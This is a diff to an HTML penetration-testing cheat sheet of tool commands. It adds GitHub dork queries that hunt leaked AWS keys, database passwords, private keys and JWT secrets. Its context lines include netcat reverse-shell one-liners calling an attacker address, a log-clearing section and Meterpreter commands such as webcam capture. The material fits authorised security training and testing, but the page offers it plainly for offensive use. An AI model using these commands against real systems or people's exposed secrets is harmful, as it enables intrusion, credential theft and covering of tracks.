@@ -30,24 +30,25 @@
 <h2 align='center' id='n1'><em> Commands </em></h2> 
 Topic contains:
 	<li> Remote Desktop Protocol <a href='#n1.1'> (RDP) </a>
-	<li> <a href='#n1.2'> PowerShell </a> </li>
-	<li> <a href='#n1.3'> Linux </a>
-	<li> <a href='#n1.4'> Windows </a>
-	<li> <a href='#n1.5'> Nmap </a> commands with search vulnerabilities scripts
-	<li> <a href='#n1.6'> Gobuster </a> dirs amd subdomains enumeration commands
-	<li> <a href='#n1.7'> Hydra </a>
-	<li> <a href='#n1.8'> Dirsearch </a>
-	<li> <a href='#n1.9'> Pumping </a> shell
-	<li> <a href='#n1.10'> SQLmap </a>
-	<li> <a href='#n1.11'> John The Ripper </a>
- 	<li> <a href='#n1.12'> Hashcat </a>
-  	<li> <a href='#n1.13'> Google Dorks </a>
-   	<li> <a href='#n1.14'> Ffuf </a>
-    	<li> <a href='#n1.15'> Rustscan </a>
-      	<li> <a href='#n1.16'> Masscan </a>
-        <li> <a href='#n1.17'> Meterpreter </a>
-	<li> <a href='#n1.18'> CMD (Windows)</a>
-        <li> <a href='#n1.19'> Reverse shell</a>
+	<li> <a href='#n1.2'>PowerShell</a>
+	<li> <a href='#n1.3'>Linux</a>
+	<li> <a href='#n1.4'>Windows</a>
+	<li> <a href='#n1.5'>Nmap</a> commands with search vulnerabilities scripts
+	<li> <a href='#n1.6'>Gobuster</a> dirs amd subdomains enumeration commands
+	<li> <a href='#n1.7'>Hydra</a>
+	<li> <a href='#n1.8'>Dirsearch</a>
+	<li> <a href='#n1.9'>Pumping</a> shell
+	<li> <a href='#n1.10'>SQLmap</a>
+	<li> <a href='#n1.11'>John The Ripper</a>
+ 	<li> <a href='#n1.12'>Hashcat</a>
+  	<li> <a href='#n1.13'>Google Dorks</a>
+	<li> <a href='#n1.14'>GitHub Dorking</a>
+   	<li> <a href='#n1.15'>Ffuf</a>
+    	<li> <a href='#n1.16'>Rustscan</a>
+      	<li> <a href='#n1.17'>Masscan</a>
+        <li> <a href='#n1.18'>Meterpreter</a>
+	<li> <a href='#n1.19'>CMD (Windows)</a>
+        <li> <a href='#n1.20'>Reverse shell</a>
 		
 <h3 id='n1.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Remote Desktop Protocol (RDP): </ins></h3>
   <pre><code> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;'PASSWORD'> </code></pre>
@@ -357,11 +358,36 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 		<li> ext or filteype - search by page extension
 		<li> More <a href='https://gist.github.com/stevenswafford/393c6ec7b5375d5e8cdc'> here </a>
 	</ul>
+ 
+<h3 id='n1.14'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> GitHub Dorking </ins></h3>
+	<ul>
+		<li> AWS keys
+			<pre><code>path:**/.env AWS_ACCESS_KEY_ID</code></pre>
+		<li> Open DB passwords
+			<pre><code></code>DB_PASSWORD=</pre>
+		<li> DB dump files
+			<pre><code>path:*.sql "CREATE TABLE" AND "INSERT INTO"</code></pre>
+		<li> API keys
+			<pre><code>path:**/.properties api_key</code></pre>
+		<li> Root passwords in docker-compose
+			<pre><code>path:**/docker-compose.yml MYSQL_ROOT_PASSWORD</code></pre>
+		<li> Private keys
+			<pre><code>path:*.pem private</code></pre>
+		<li> Open secrets JWT
+			<pre><code>language:javascript jwt_secret OR jwt_key</code></pre>
+		<li> Open .git directories
+			<pre><code>path:**/.git/*</code></pre>
+		<li> Public ssh keys
+			<pre><code>path:*.pub "ssh-rsa"</code></pre>
+		<li> Passphrase
+			<pre><code>passphrase * path:**/.json</code></pre>
+		<li> Check commit and issues
+	</ul>
 
- <h3 id='n1.14'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> FFUF</ins></h3>
+ <h3 id='n1.15'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> FFUF</ins></h3>
  	<pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://&lt;SERVER_IP>:&lt;PORT>/FUZZ.php</code></pre>
 
- <h3 id='n1.15'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Rustscan</ins></h3>
+ <h3 id='n1.16'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Rustscan</ins></h3>
  	<ul>
 		<li> Download <a href='https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb'> deb packet </a>
 		<li> Install: <pre><code>sudo dpkg -i rustscan_2.0.1_amd64.deb</code></pre>
@@ -379,7 +405,7 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
   	</ul>
 
 
- <h3 id='n1.16'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Masscan</ins></h3>
+ <h3 id='n1.17'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Masscan</ins></h3>
  	<ul>
 	 	<li> Scanning a Single IP Address:
 	  		<pre><code>masscan &lt;target_ip></code></pre>
@@ -403,7 +429,7 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 				<p> flags allows to specify the source IP and port for scanning through a SOCKS5 proxy.
  	</ul>
 
- <h3 id='n1.17'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Meterpreter</ins></h3>
+ <h3 id='n1.18'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Meterpreter</ins></h3>
  	<ul>
 		<li> arp - displays MAC and IP addresses of local devices interacted with
 		<li> cd - command to change to another directory/folder
@@ -434,7 +460,7 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 		<li> webcam_stream - obtains a video stream from the remote built-in camera
   	</ul>
 
- <h3 id='n1.18'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> CMD </ins></h3>
+ <h3 id='n1.19'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> CMD </ins></h3>
  <ol>
 	<li> Clearing log files
 		<ul>
@@ -489,7 +515,7 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
   	rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
  </ol>
 
-<h3 id='n1.19'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Reverse Shell </ins></h3>
+<h3 id='n1.20'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Reverse Shell </ins></h3>
 	<ol>
 		<li> <pre><code> rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &lt;ATTACKER_IP> &lt;ATTACKER_PORT> >/tmp/f </code></pre>
   	</ol>
